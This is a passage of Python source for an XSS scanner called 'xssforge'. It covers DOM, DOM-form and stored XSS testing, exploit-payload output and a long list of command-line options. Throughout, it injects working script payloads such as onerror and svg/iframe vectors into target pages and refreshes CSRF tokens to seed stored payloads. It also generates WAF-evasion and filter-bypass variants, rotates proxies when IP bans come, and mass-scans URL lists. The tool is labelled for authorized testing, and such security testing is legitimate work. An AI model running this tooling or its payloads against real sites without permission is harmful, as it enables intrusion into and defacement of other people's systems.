    Only controllable, testable sources are attempted. Unsupported sources stay
    NOT_VERIFIED with an explicit reason instead of being called confirmed.
    """
    if not findings or not (opts.browser and state.get("browser")
                            and state.get("browser").available):
        return findings
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    param = pairs[0][0] if pairs else "q"
    for i, finding in enumerate(findings):
        source = str(finding.get("source") or "").lower()
        if "hash" in source:
            loc, data = "fragment", {}
        elif any(k in source for k in ("search", "query", "urlsearchparams", "searchparams")):
            loc, data = "query", {param: ""}
        else:
            finding.setdefault("verification", xf_verify.FINDING_NOT_VERIFIED)
            finding.setdefault("verification_reason",
                               "source not browser-testable: %s" % (source or "unknown"))
            continue
        token = "zq" + secrets.token_hex(5)
        value = P.canaryize("<img src=x onerror=alert('__M__')>", token)
        point = xf_points.Point(label="%s:%d" % (label, i), method="GET",
                                url=url, location=loc, name=param, data=data)
        shot = screenshot_path(opts, point, "dom_%d" % i)
        vr = browser_verify(point, value, token, shot, opts, state)
        if vr.get("hit"):
            finding["status"] = "CONFIRMED"
            finding["verification"] = xf_verify.FINDING_CONFIRMED
            finding["verification_reason"] = str(vr.get("detail") or "browser execution proof")[:300]
            finding["browser_evidence"] = vr.get("evidence")
            finding["detail"] = vr.get("detail")
            finding["screenshot"] = shot
            emit(c("    [CONFIRMED][DOM] %s <- %s" %
                   (finding.get("sink"), finding.get("source")), "green"))
        else:
            finding.setdefault("verification", xf_verify.FINDING_NOT_VERIFIED)
            finding.setdefault("verification_reason",
                               str(vr.get("detail") or "no canary execution observed")[:300])
    return findings


def run_dom_form(opts, state, browser, factory, limiter):
    """Browser-driven DOM-stored test: fill an on-page field, submit via the
    page's own handler, and look for execution of injected payloads."""
    token = "zq" + secrets.token_hex(5)
    seen = set()
    items = []
    # Literal alert(1) primitives first: challenge platforms often require the
    # exact numeric call (their own UI is the win oracle), not a canary token.
    for p in ('"+alert(1)+"', '";alert(1);//', "';alert(1);//",
              "<script>alert(1)</script>", '" onfocus="alert(1)',
              "<script>alert('__M__')</script>",
              "<img src=x onerror=alert('__M__')>",
              "<svg onload=alert('__M__')>"):
        if p not in seen:
            seen.add(p)
            items.append(p)
    for cat in ("dom", "html", "polyglot", "svg", "script", "script_string"):
        for _n, p in P.PAYLOADS.get(cat, []):
            if p in seen:
                continue
            seen.add(p)
            items.append(p)
    result = {
        "point": "dom-form:%s" % opts.dom_form,
        "url": opts.url, "method": "BROWSER", "location": "dom-form",
        "param": opts.dom_form, "reflected": True, "context": "dom-form",
        "candidates": [], "confirmed": False, "notes": [],
        "blind_confirmed": False, "blind_hits": [], "dom_findings": [],
    }
    tried = 0
    for raw in items[:40]:

        # Challenge platforms require the literal numeric alert(1); do not let
        # canaryize() rewrite it into alert('TOKEN').
        value = raw if "alert(1)" in raw else P.canaryize(raw, token)
        shot = screenshot_path(opts, xf_points.Point(
            label="domform", method="BROWSER", url=opts.url,
            location="dom-form", name=opts.dom_form, data={}),
            "domform_%d" % tried)
        vr = browser_verify_form(opts.url, opts.dom_form, value,
                                 opts.dom_form_submit, token, shot, opts, state)
        tried += 1
        if vr.get("blocked") or vr.get("error"):
            state.setdefault("browser_blocked" if vr.get("blocked") else "browser_error", [0])[0] += 1
        if not vr.get("hit"):
            continue
        dom_form_entry = {
            "name": "dom-form:%s" % raw[:40], "payload": raw, "value": value,
            "context": "dom-form", "reflection": {"encoding": "dom-stored"},
            "status": "CONFIRMED", "confidence": 95,
            "detail": vr.get("detail"), "url": opts.url, "body": "",
            "curl": "", "evidence": "", "screenshot": shot,
        }
        set_verification(dom_form_entry, vr)
        result["candidates"].append(dom_form_entry)
        result["confirmed"] = True
        emit(c("    [EXPLOIT][DOM-FORM] %s" % raw, "green"))
        break
    result["notes"].append("dom-form: %d payloads tried" % tried)
    return [result]


# ---------------------------------------------------------------------------
# Stored XSS
# ---------------------------------------------------------------------------

def _refresh_csrf_for_point(point, url, opts, state):
    """Re-fetch a page and update the point's data with a fresh CSRF token and
    any Set-Cookie values, so stored seeding works against rotating CSRF."""
    if not url:
        return
    try:
        s = state["factory"].get()
        r = s.get(url, timeout=opts.timeout, verify=not opts.insecure)
        body = r.text or ""
        token_m = re.search(
            r'<input[^>]*name=["\']([^"\']*token[^"\']*)["\'][^>]*value=["\']([^"\']+)',
            body, re.I)
        if token_m and isinstance(point.data, dict):
            field, value = token_m.group(1), token_m.group(2)
            point.data[field] = value
            point.data["csrf"] = value
            for known in ("csrf_token", "_token", "user_token"):
                if known in point.data:
                    point.data[known] = value
        # Merge any refreshed cookies from the response into the session jar.
        try:
            for ck in r.cookies:
                s.cookies.set_cookie(ck)
        except Exception:
            pass
    except Exception:
        pass


def _is_attachment(resp):
    try:
        cd = (resp.headers.get("Content-Disposition") or "").lower()
        ct = (resp.headers.get("Content-Type") or "").lower()
    except Exception:
        return False
    return ("attachment" in cd or ct.startswith(
        ("application/octet-stream", "application/pdf", "application/zip",
         "image/png", "image/jpeg", "image/gif")))


def stored_check(opts, state, points):
    """Seed stored payloads, then render every trigger URL in the browser."""
    triggers = list(getattr(opts, "stored_urls", None) or [])
    if not triggers and opts.stored_url:
        triggers = [opts.stored_url]
    if not triggers:
        return []
    seeds = [
        "<script>alert('%s')</script>",
        "\"><svg onload=alert('%s')>",
        "<img src=x onerror=alert('%s')>",
        "'><script>alert('%s')</script>",
        "<svg onload=alert('%s')>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert('%s')</script></svg>",
        "\"><img src=x onerror=alert('%s')>.svg",
        "<iframe srcdoc=\"<script>alert('%s')</script>\"></iframe>",
    ]
    csrf_url = getattr(opts, "csrf_url", "") or triggers[0]
    combos = [(point, seed) for point in points
              if point.location != "fragment" for seed in seeds]
    if not combos:
        return []

    results = []
    for trigger_url in triggers:
        token = "st" + secrets.token_hex(5)
        # Re-seed with this trigger's unique token so the render check is exact.
        delivered = 0
        for point, seed in combos:
            new_val = seed % token
            _refresh_csrf_for_point(point, csrf_url, opts, state)
            r = send(state["factory"], state["limiter"], point, new_val, opts,
                     count_block=False)
            if not isinstance(r, Exception):
                delivered += 1
        trigger = xf_points.Point(label="stored:%s" % trigger_url, method="GET",
                                  url=trigger_url, location="fragment",
                                  name="stored", data={})
        result = {"point": trigger.label, "url": trigger_url, "method": "GET",
                  "location": "stored", "param": "stored", "reflected": False,
                  "context": "stored", "candidates": [], "confirmed": False,
                   "notes": ["seeded %d stored payloads" % delivered],
                   "blind_confirmed": False, "blind_hits": [], "dom_findings": [],
                   "test_id": token,
                   "cleanup": {"status": "not_configured", "url": "", "detail": ""}}
        attachment = False
        try:
            r = state["factory"].get().get(trigger_url, timeout=opts.timeout,
                                           verify=not opts.insecure)
            attachment = _is_attachment(r)
            if attachment:
                result["notes"].append(
                    "trigger served as a download (attachment) — not rendered, "
                    "skipping reflection/browser proof")
                emit(c("    [STORED] %s is an attachment; skipped" % trigger_url,
                       "yellow"))
            elif token in (r.text or ""):
                result["reflected"] = True
                result["candidates"].append({
                    "name": "stored:reflected", "payload": "<stored payload>",
                    "value": "", "context": "stored",
                    "reflection": {"encoding": "raw"},
                    "status": "LIKELY", "confidence": 80,
                    "detail": "seeded canary reflected on the stored trigger URL",
                    "url": trigger_url, "body": "", "curl": "",
                    "evidence": hold_evidence(opts, trigger, token, r),
                    "screenshot": ""})
                emit(c("    [STORED REFLECTED] %s" % trigger_url, "yellow"))
        except Exception:
            pass
        if (not attachment and opts.browser and state.get("browser")
                and state.get("browser").available):
            for i, (_point, seed) in enumerate(combos):
                shot = screenshot_path(opts, trigger, "stored_%d" % i)
                val = seed % token
                vr = browser_verify(trigger, val, token, shot, opts, state,
                                    reuse_token=True)
                if vr.get("blocked") or vr.get("error"):
                    state.setdefault(
                        "browser_blocked" if vr.get("blocked") else "browser_error",
                        [0])[0] += 1
                    emit(c("    [BROWSER BLOCKED] %s" %
                           vr.get("detail", "challenge"), "red"))
                if not vr.get("hit"):
                    continue
                payload = seed % "__M__"
                result["confirmed"] = True
                stored_entry = {
                    "name": "stored:execution", "payload": payload, "value": val,
                    "context": "stored", "reflection": {"encoding": "stored"},
                    "status": "CONFIRMED", "confidence": 95,
                    "detail": vr.get("detail"), "url": trigger_url, "body": "",
                    "curl": "", "evidence": "", "screenshot": shot}
                set_verification(stored_entry, vr)
                result["candidates"].append(stored_entry)
                emit(c("    [EXPLOIT][STORED] %s" % payload, "green"))
                if opts.first_hit:
                    break
        results.append(result)
    _cleanup_stored(opts, state, results)
    return results


def _cleanup_stored(opts, state, results):
    """Remove disposable stored test records when the operator supplies a URL."""
    url = getattr(opts, "stored_cleanup_url", "") or ""
    if not url:
        return
    try:
        resp = state["factory"].get().get(url, timeout=opts.timeout,
                                          verify=not opts.insecure)
        status = "ok" if getattr(resp, "status_code", 0) < 400 else "failed"
        detail = "HTTP %s" % getattr(resp, "status_code", "?")
    except Exception as e:
        status, detail = "failed", str(e)[:120]
    for result in results:
        result["cleanup"] = {"status": status, "url": url, "detail": detail}
        result["notes"].append("stored cleanup: %s (%s)" % (status, detail))
    emit(c("stored: cleanup %s (%s)" % (status, detail),
           "green" if status == "ok" else "yellow"))


def hold_evidence(opts, point, token, resp):
    return save_evidence(opts, point, "stored", "<stored>", token, resp)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def normalize_argv(argv, ap):
    """Split concatenated boolean long options into separate tokens.

    ``--authorized-browser--auto`` becomes ``--authorized --browser --auto``.
    Value-taking options and unknown tokens are left untouched.
    """
    bool_names = sorted(
        (opt[2:] for action in ap._actions if action.nargs == 0
         for opt in action.option_strings if opt.startswith("--")),
        key=len, reverse=True)
    out = []
    for token in argv:
        if token.startswith("--") and "-" in token[2:]:
            body, parts, pos = token[2:], [], 0
            while pos < len(body):
                match = next((n for n in bool_names
                              if body.startswith(n, pos) and
                              (pos + len(n) == len(body) or
                               body[pos + len(n)] == "-")), None)
                if match is None:
                    break
                parts.append("--" + match)
                pos += len(match)
                while pos < len(body) and body[pos] == "-":
                    pos += 1
            if len(parts) > 1 and pos == len(body):
                out.extend(parts)
                continue
        out.append(token)
    return out


def build_argparser():
    ap = argparse.ArgumentParser(
        description="xssforge - context-aware XSS scanner with execution proof",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Authorized testing only.")
    ap.add_argument("-u", "--url")
    ap.add_argument("-p", "--param", action="append", default=[])
    ap.add_argument("-d", "--data", default="")
    ap.add_argument("-X", "--method", default="")
    ap.add_argument("-c", "--cookie", default="")
    ap.add_argument("--cookie-file", default="", help="Netscape cookies.txt jar")
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("--login-url", default="", help="login endpoint used to establish a session")
    ap.add_argument("--login-data", default="", help="urlencoded login form body")
    ap.add_argument("--login-json", default="", help="JSON login body")
    ap.add_argument("--login-method", default="POST", choices=["GET", "POST", "PUT"])
    ap.add_argument("--raw", dest="raw_request", default="", help="Burp-style raw HTTP request file")
    ap.add_argument("--raw-inject", action="store_true",
                    help="send query values as literal bytes (no URL encoding); "
                         "finds reflection that only occurs with raw quotes/angles")
    ap.add_argument("--scheme", default="https", choices=["http", "https"])
    ap.add_argument("--inject-header", action="append", default=[])
    ap.add_argument("--inject-cookie", action="append", default=[])
    ap.add_argument("--fragment", action="store_true", help="test the URL fragment (DOM)")
    ap.add_argument("--path", action="store_true", help="test the last URL path segment")
    ap.add_argument("--crawl", action="store_true")
    ap.add_argument("--crawl-depth", type=int, default=2)
    ap.add_argument("--crawl-max-pages", type=int, default=50)
    ap.add_argument("--crawl-subdomains", action="store_true")
    ap.add_argument("--openapi", default="", help="OpenAPI/Swagger spec URL or file to import")
    ap.add_argument("--dom", action="store_true", help="static DOM source->sink analysis")
    ap.add_argument("--dom-form", default="",
                    help="CSS selector of an on-page input/textarea for DOM-stored "
                         "testing (e.g. '#post-content'); the page's own submit "
                         "handler is used")
    ap.add_argument("--dom-form-submit", default="",
                    help="CSS selector of the submit button (default: submit inside "
                         "the same form)")
    ap.add_argument("--dom-fuzz", action="store_true", help="browser-test fragment/params with DOM payloads")
    ap.add_argument("--blind", default="", help="external callback base URL")
    ap.add_argument("--oob-server", nargs="?", const=8888, type=int, default=0,
                    help="start built-in HTTP collaborator on PORT")
    ap.add_argument("--oob-host", default="127.0.0.1", help="public host/IP for OOB URLs")
    ap.add_argument("--oob-wait", type=float, default=8.0)
    ap.add_argument("--interactsh", nargs="?", const="oast.fun", default="",
                    help="auto-register with an interactsh server (default oast.fun)")
    ap.add_argument("--interactsh-token", default="", help="auth token for private interactsh server")
    ap.add_argument("--browser", action="store_true")
    ap.add_argument("--headed", action="store_true",
                    help="show a visible browser window (requires a display / Xvfb)")
    ap.add_argument("--show-on-confirm", action="store_true",
                    help="scan headless but open a visible browser on each CONFIRMED hit so you can see the alert and click OK")
    ap.add_argument("--save-poc", action="store_true",
                    help="write a standalone HTML file per CONFIRMED hit that recreates the injection context and fires the alert")
    ap.add_argument("--no-browser", dest="no_browser", action="store_true",
                    default=False,
                    help="disable browser proof even when --auto/--all enables it")
    ap.add_argument("--browser-max", type=int, default=4)
    ap.add_argument("--browser-wait", type=float, default=3.5,
                    help="seconds to collect browser proof after each navigation")
    ap.add_argument("--browser-pool", type=int, default=2)
    ap.add_argument("--payloads", action="append", default=[], help="extra payload file(s)")
    ap.add_argument("--payload-limit", type=int, default=300, help="0 = all")
    ap.add_argument("--max-candidates", type=int, default=500,
                    help="max candidates kept per injection point (0 = unlimited)")
    ap.add_argument("--embed-shots", dest="embed_shots", action="store_true",
                    default=True,
                    help="embed confirmed screenshots directly in the HTML report "
                         "(default on)")
    ap.add_argument("--no-embed-shots", dest="embed_shots", action="store_false",
                    help="link screenshots instead of embedding them")
    ap.add_argument("--dump-generated", default="",
                    help="write N generated bypass payloads to a file and exit "
                         "(no requests sent); combine with --dump-count and --bypass-seed")
    ap.add_argument("--dump-count", type=int, default=100,
                    help="number of payloads for --dump-generated (default 100)")
    ap.add_argument("--recommend", action="store_true",
                    help="print recommended commands for the target and exit "
                         "(no requests are sent)")
    ap.add_argument("--auto", action="store_true",
                    help="view-source style filter fingerprint: probe which "
                         "characters/keywords are blocked, removed or escaped, "
                         "then automatically pick encoders and canary style "
                         "before testing payloads")
    ap.add_argument("--auto-probes", type=int, default=0,
                    help="limit number of filter probes (0 = all)")
    ap.add_argument("--auto-points", type=int, default=3,
                    help="how many injection points to fingerprint (default 3)")
    ap.add_argument("--probe-chars", default="",
                    help="probe only these tokens (comma separated), e.g. "
                         "'<,>,/' or \"<,>,/,',\\\"\" — use \\t \\n \\s for whitespace")
    ap.add_argument("--first-hit", action="store_true",
                    help="stop the corpus sweep at the first reflection, then "
                         "escalate that payload with every encoder/bypass/mutation "
                         "until execution is proven; print the exploit payload")
    ap.add_argument("--no-first-hit", dest="no_first_hit", action="store_true",
                    default=False,
                    help="disable first-hit escalation even when --auto enables it")
    ap.add_argument("--first-hit-bases", type=int, default=3,
                    help="reflective payloads to keep as escalation seeds when "
                         "browser proof fails (default 3)")
    ap.add_argument("--first-hit-max", type=int, default=30,
                    help="max variants to try per first-hit seed (default 30)")
    ap.add_argument("--deep-bypass", action="store_true",
                    help="after normal passes fail, lazily generate and test "
                         "unlimited filter-aware bypass variants until one works "
                         "or --bypass-max / --bypass-time is reached")
    ap.add_argument("--bypass-max", type=int, default=100,
                    help="max generated variants to test (default 100)")
    ap.add_argument("--bypass-time", type=float, default=300.0,
                    help="max seconds for the deep-bypass loop (default 300)")
    ap.add_argument("--bypass-seed", default="",
                    help="payload to seed the generator (default: first reflected "
                         "candidate from this point)")
    ap.add_argument("--seed-payloads", type=int, default=20,
                    help="web-derived corpus payloads to try before generating "
                         "new ones (default 20)")
    ap.add_argument("--web-refresh", action="store_true",
                    help="fetch current public XSS payload sources first and use "
                         "their payloads as seeds (needs network)")
    ap.add_argument("--exploit-out", default="",
                    help="file to write the winning exploit payload (default: "
                         "<output-dir>/exploit-<timestamp>.txt)")
    ap.add_argument("--mutate", dest="mutate", action="store_true", default=True,
                    help="derive WAF-evasion variants from corpus payloads (default on)")
    ap.add_argument("--no-mutate", dest="mutate", action="store_false")
    ap.add_argument("--mutate-base", type=int, default=4, help="corpus payloads to mutate per point")
    ap.add_argument("--mutate-max", type=int, default=24, help="max variants per base payload")
    ap.add_argument("--bypass", dest="bypass", action="store_true", default=True,
                    help="pair every payload with an obfuscated filter-bypass variant (default on)")
    ap.add_argument("--no-bypass", dest="bypass", action="store_false")
    ap.add_argument("--bypass-variants", type=int, default=6,
                    help="bypass variants generated per payload (default 6)")
    ap.add_argument("--canary-style", choices=("quoted", "ident", "regex", "template"),
                    default="quoted",
                    help="how the canary is embedded in output calls. Use "
                         "'regex' when the target backslash-escapes quotes "
                         "(alert(/TOKEN/) instead of alert('TOKEN'))")
    ap.add_argument("--encode", default="", help="comma list or 'all': " + ",".join(P.ENCODER_NAMES))
    ap.add_argument("--encode-max", type=int, default=4)
    ap.add_argument("--decode", default="", metavar="STRING",
                    help="try every decoder on a payload and print results")
    ap.add_argument("--list-encoders", action="store_true",
                    help="list all encoders/decoders")
    ap.add_argument("--threads", type=int, default=8)
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--delay", type=float, default=0.10)
    ap.add_argument("--max-blocks", type=int, default=12,
                    help="abort the scan after this many WAF/IP-block responses "
                         "(0 = never abort)")
    ap.add_argument("--block-cooldown", type=float, default=0.0,
                    help="seconds to pause after each block response")
    ap.add_argument("--ban-wait", type=float, default=0.0,
                    help="on apparent URL/IP ban, wait this many seconds and "
                         "rotate to the next proxy (up to 3 times) before aborting; "
                         "requires --proxy-file with 2+ proxies")
    ap.add_argument("--retries", type=int, default=3,
                    help="retries for transient network/502/503/504 errors")
    ap.add_argument("--proxy", default="")
    ap.add_argument("--proxy-file", default="",
                    help="file with one proxy URL per line (http://… or socks5://…). "
                         "On a WAF/IP block the tool rotates to the next proxy")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--user-agent", default=Options.user_agent)
    ap.add_argument("--output-dir", default="xssforge-out")
    ap.add_argument("--evidence-max", type=int, default=150,
                    help="max response evidence files kept (prevents disk blow-up)")
    ap.add_argument("--hunt", action="store_true",
                    help="print a methodology-driven hunt plan from recon signals")
    ap.add_argument("--all", action="store_true",
                    help="cover everything: crawl, browser, DOM, fragment, encoders")
    ap.add_argument("--full", action="store_true",
                    help="universal preset: --all + --auto + browser proof + first-hit "
                         "+ retries + all reports; no per-site flag changes")
    ap.add_argument("--report", default="json,html,md",
                    help="comma list: json,jsonl,html,md,sarif,toml")
    ap.add_argument("--json", action="store_true", help="print JSON summary to stdout")
    ap.add_argument("--stored-url", default="", help="URL that renders stored input")
    ap.add_argument("--sxss-url", action="append", default=[],
                    help="repeatable stored/trigger URL (upload render pages, profiles)")
    ap.add_argument("--stored-cleanup-url", default="",
                    help="operator-provided URL that deletes disposable stored test records")
    ap.add_argument("--only-poc", action="store_true",
                    help="keep only verified/actionable findings (tier V/A)")
    ap.add_argument("--ai-fallback", action="store_true",
                    help="opt-in LLM-generated payload fallback (needs XSSFORGE_AI_KEY)")
    ap.add_argument("--ai-model", default="", help="model id for --ai-fallback")
    ap.add_argument("--ai-count", type=int, default=8,
                    help="max AI payloads per point")
    ap.add_argument("--waf-min-confidence", type=int, default=0,
                    help="only report WAF attribution at/above this confidence")
    ap.add_argument("--csrf-url", default="",
                    help="page to re-fetch before each stored seed to obtain a fresh CSRF token (auto-detected from --stored-url if omitted)")
    ap.add_argument("--libscan", action="store_true",
                    help="detect outdated/vulnerable JavaScript libraries and their known XSS advisories")
    ap.add_argument("--hpp", action="store_true",
                    help="HTTP parameter pollution: split/dup payloads across repeated params")
    ap.add_argument("--hpp-parts", type=int, default=3,
                    help="number of repeated params for --hpp (default: 3)")
    ap.add_argument("--structural", action="store_true",
                    help="send structural WAF mutations (JSON dup keys, multipart confusion, size windows)")
    ap.add_argument("--structural-pad", type=int, default=2048,
                    help="junk prefix length for structural size-window probes")
    ap.add_argument("--min-confidence", choices=("low", "high"), default="low",
                    help="high filters reflection-only noise from reports")
    ap.add_argument("--header-sweep", action="store_true",
                    help="automatically inject a standard header set")
    ap.add_argument("--cookie-sweep", action="store_true",
                    help="automatically inject cookies parsed from -c/--cookie-file")
    ap.add_argument("--param-mine", action="store_true",
                    help="mine parameter names from page HTML/JS and remote wordlists")
    ap.add_argument("--param-wordlist", default="",
                    help="extra newline-delimited parameter wordlist (URL or file)")
    ap.add_argument("--param-mine-max", type=int, default=20,
                    help="max mined parameters (default: 20)")
    ap.add_argument("--postman", default="", help="Postman collection file to import")
    ap.add_argument("--har", dest="har_file", default="", help="HAR capture file to import")
    ap.add_argument("--mass", dest="mass_file", default="", help="newline-delimited URL list for mass scanning")
    ap.add_argument("--mass-state", dest="mass_state", default="xssforge-mass.json",
                    help="state file for --mass resume (default: xssforge-mass.json)")
    ap.add_argument("--resume", dest="mass_resume", action="store_true",
                    help="resume --mass from --mass-state")
    ap.add_argument("--baseline", dest="mass_baseline", action="store_true",
                    help="baseline-check each --mass URL before scanning")
    ap.add_argument("--dry-run", dest="mass_dry_run", action="store_true",
                    help="show --mass targets without scanning")
    ap.add_argument("--mass-limit", type=int, default=0,
                    help="limit number of --mass targets (0 = all)")
    ap.add_argument("--show-evidence", action="store_true")
    ap.add_argument("--quiet", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--authorized", action="store_true")
    ap.add_argument("--list-payloads", action="store_true")
    ap.add_argument("--coverage", action="store_true")
    ap.add_argument("--stats", action="store_true", help="show corpus statistics")
    ap.add_argument("--no-banner", action="store_true")
    ap.add_argument("--version", action="version", version="xssforge 2.1")
    return ap


def emit_exploit(results, opts, outdir, stamp):
    """Print (and save) the single best working exploit payload."""
    best = None
    status_order = {"CONFIRMED": 3, "BLIND": 2, "LIKELY": 1, "REFLECTED": 0}
    for r in results:
        for cand in r.get("candidates") or []:
            if (best is None or
                    status_order.get(cand.get("status"), 0) >
                    status_order.get(best[1].get("status"), 0)):
                best = (r, cand)
        if r.get("blind_confirmed") and best and best[1].get("status") != "CONFIRMED":
            for h in r.get("blind_hits") or []:
                best = (r, {"name": "blind:" + str(h.get("token", "")),
                            "status": "BLIND", "confidence": 90,
                            "payload": str(h.get("payload", "")),
                            "detail": "out-of-band callback hit",
                            "url": r.get("url", ""), "curl": ""})
    dom = None
    for r in results:
        if r.get("dom_findings"):
            dom = r["dom_findings"][0]
            break
    if not best and not dom:
        return None

    lines = []
    lines.append("=" * 68)
    lines.append("[EXPLOIT PAYLOAD]")
    if best:
        r, cand = best
        lines.append("  status  : %s (confidence %s)" %
                     (cand.get("status"), cand.get("confidence")))
        lines.append("  type    : %s" % (r.get("location") or "reflected"))
        lines.append("  point   : %s" % (r.get("param") or "-"))
        lines.append("  context : %s" %
                     (cand.get("context") or r.get("context") or "-"))
        lines.append("  vector  : %s" % (cand.get("name") or "-"))
        refl = cand.get("reflection") or {}
        proof_note = ("per-scan canary proves this exact payload executed"
                      if cand.get("status") == "CONFIRMED" else
                      "exact canary reflected; execution NOT proven")
        lines.append("  why     : %s context + %s reflection; %s" %
                     (cand.get("context") or r.get("context") or "-",
                      refl.get("encoding") or "-", proof_note))
        lines.append("  payload : %s  (template)" % (cand.get("payload") or "-"))
        lines.append("  sent    : %s  (exact bytes delivered)" %
                     (cand.get("value") or cand.get("payload") or "-"))
        lines.append("  proof   : %s" % (cand.get("detail") or "-"))
        if cand.get("url"):
            lines.append("  url     : %s" % cand["url"])
        if cand.get("curl"):
            lines.append("  curl    : %s" % cand["curl"])
        if cand.get("screenshot"):
            lines.append("  screen  : %s" % cand["screenshot"])
    if dom:
        lines.append("  DOM sink: %s <- %s (%s)" %
                     (dom.get("sink"), dom.get("source"), dom.get("script")))
        lines.append("  DOM note: static source->sink; needs manual/browser validation")
    lines.append("=" * 68)
    text = "\n".join(lines)
    emit(c(text, "green"))
    try:
        os.makedirs(outdir, exist_ok=True)
        path = opts.exploit_out or os.path.join(outdir, "exploit-%s.txt" % stamp)
        with open(path, "w", encoding="utf-8") as f:
            f.write(text + "\n")
        emit("exploit saved: %s" % path)
    except Exception as e:
        emit(c("exploit save failed: %s" % e, "yellow"))
    return best[1].get("payload") if best else None


def libscan_check(opts, state, browser=None):
    """Detect outdated JS libraries on the target URL."""
    result = {"point": "libscan", "url": opts.url, "method": "GET",
              "location": "libscan", "param": "-", "reflected": False,
              "context": "libscan", "candidates": [], "confirmed": False,
              "notes": [], "blind_confirmed": False, "blind_hits": [],
              "dom_findings": []}
    libs = []
    try:
        s = state["factory"].get()
        r = s.get(opts.url, timeout=opts.timeout, verify=not opts.insecure)
        libs.extend(xf_libscan.scan_scripts(s, opts.url, r.text or "",
                                            timeout=opts.timeout,
                                            insecure=opts.insecure))
    except Exception as e:
        result["notes"].append("libscan fetch failed: %s" % str(e)[:120])
    # browser globals
    if browser is not None and browser.available:
        try:
            d = browser._acquire()
            d.get(opts.url)
            libs.extend(xf_libscan.browser_probe(d))
            browser._release(d)
        except Exception:
            pass
    # dedupe
    seen = set()
    uniq = []
    for x in libs:
        k = (x.get("library"), x.get("version"))
        if k in seen:
            continue
        seen.add(k)
        uniq.append(x)
    vulns = [x for x in uniq if x.get("vulns")]
    for x in uniq:
        tag = "VULNERABLE" if x.get("vulns") else "ok"
        desc = "%s %s (%s)" % (x["library"], x["version"], tag)
        if x.get("vulns"):
            desc += " — " + x["vulns"][0]["summary"]
        emit(c("    [LIB] %s  <- %s" % (desc, x.get("url", "")[:90]),
               "red" if x.get("vulns") else "dim"))
        result["candidates"].append({
            "name": "lib:" + x["library"], "payload": "", "value": "",
            "context": "libscan", "reflection": {"encoding": "n/a"},
            "status": "LIKELY" if x.get("vulns") else "REFLECTED",
            "confidence": 70 if x.get("vulns") else 20,
            "detail": desc, "url": x.get("url", ""), "body": "",
            "curl": "", "evidence": "", "screenshot": ""})
    result["notes"].append("libraries detected: %d (%d with known vulns)" %
                           (len(uniq), len(vulns)))
    return [result]


def main():
    ap = build_argparser()
    a = ap.parse_args(normalize_argv(sys.argv[1:], ap))
    a._scan_started = time.time()
    _INTERRUPT.clear()
    try:
        signal.signal(signal.SIGINT, _handle_interrupt)
    except (ValueError, OSError, AttributeError):
        pass
    P.set_canary_style(a.canary_style)
    global USE_COLOR
    if a.no_color or a.json:
        USE_COLOR = False
    if a.full:
        a.hunt = True
    if a.all or a.full:
        a.crawl = True
        a.browser = True
        a.dom = True
        a.dom_fuzz = True
        a.fragment = True
        a.hpp = True
        a.structural = True
        a.header_sweep = True
        a.cookie_sweep = True
        a.param_mine = True
        if not a.encode:
            a.encode = "all"
    if a.full:
        a.auto = True
        a.first_hit = True
        a.no_browser = False
        a.no_first_hit = False
        a.retries = max(3, int(a.retries or 0))
        a.timeout = max(30.0, float(a.timeout or 0))
        a.browser_wait = max(5.0, float(a.browser_wait or 0))
        # Keep the universal preset usable on slow real sites: broad but bounded.
        a.crawl_depth = min(int(a.crawl_depth or 2), 1)
        a.crawl_max_pages = min(int(a.crawl_max_pages or 50), 20)
        a.auto_points = min(int(a.auto_points or 3), 2)
        if not a.auto_probes:
            a.auto_probes = 12
        a.param_mine_max = min(int(a.param_mine_max or 20), 5)
        if int(a.payload_limit or 0) == 300:
            a.payload_limit = 60
        a.threads = min(int(a.threads or 8), 4)
        if a.report == "json,html,md":
            a.report = "json,jsonl,html,md,sarif"
    auto_browser_on = bool(a.auto and not a.no_browser and not a.browser)
    auto_first_on = bool(a.auto and not a.no_first_hit and not a.first_hit)
    if auto_browser_on:
        a.browser = True
    if auto_first_on:
        a.first_hit = True
    if a.first_hit and a.browser:
        # default proof budget (4) is too small for first-hit escalation.
        a.browser_max = max(a.browser_max,
                            max(1, a.first_hit_bases) * max(1, a.first_hit_max) + 10)
    if a.insecure:
        try:
            requests.packages.urllib3.disable_warnings()
        except Exception:
            pass

    if a.stats or a.list_payloads:
        if a.stats:
            unique_total = len({p for v in P.PAYLOADS.values() for _, p in v})
            print("corpus: %d category entries across %d categories "
                  "(%d unique payload strings)" %
                  (P.corpus_size(), len(P.PAYLOADS), unique_total))
            for k, v in P.PAYLOADS.items():
                print("  %-18s %d" % (k, len(v)))
            print("encoders: %d  decoders: %d" % (len(P.ENCODERS), len(P.DECODERS)))
            print("bypass techniques: %d" % len(P.BYPASS_TECHNIQUES))
        if a.list_payloads:
            for cat, items in P.PAYLOADS.items():
                print("[%s] %d" % (cat, len(items)))
                for name, payload in items:
                    print("   %-30s %s" % (name, payload))
        return
    if a.list_encoders:
        print("ENCODERS (%d):" % len(P.ENCODERS))
        for name in P.ENCODERS:
            print("  " + name)
        print("DECODERS (%d):" % len(P.DECODERS))
        for name in P.DECODERS:
            print("  " + name)
        print("BYPASS (%d):" % len(P.BYPASS_TECHNIQUES))
        for name in P.BYPASS_TECHNIQUES:
            print("  " + name)
        return
    if a.decode:
        print("input: %r" % a.decode)
        results = P.decode_all(a.decode)
        if not results:
            print("no decoder changed the input")
        for name, got in results:
            print("  %-18s %r" % (name, got))
        return
    if a.coverage:
        print("XSS TYPE COVERAGE")
        for vtype, status, note in P.COVERAGE:
            color = "green" if status.startswith("automated") else ("yellow" if "manual" in status else "cyan")
            print("  %-34s %-20s %s" % (vtype, c(status, color), note))
        return

    if (not a.url and not a.raw_request and not a.openapi
            and not a.dump_generated and not a.mass_file):
        ap.error("-u/--url (or --raw/--openapi/--mass) is required")

    if a.recommend:
        obs = xf_advice.probe(a.url, a) if a.url else {}
        print(c("=" * 68, "cyan"))
        print(c("[RECOMMENDED COMMANDS] for %s" % (a.url or a.raw_request), "cyan"))
        print(c("[probe] one lightweight GET sent to inspect the target", "dim"))
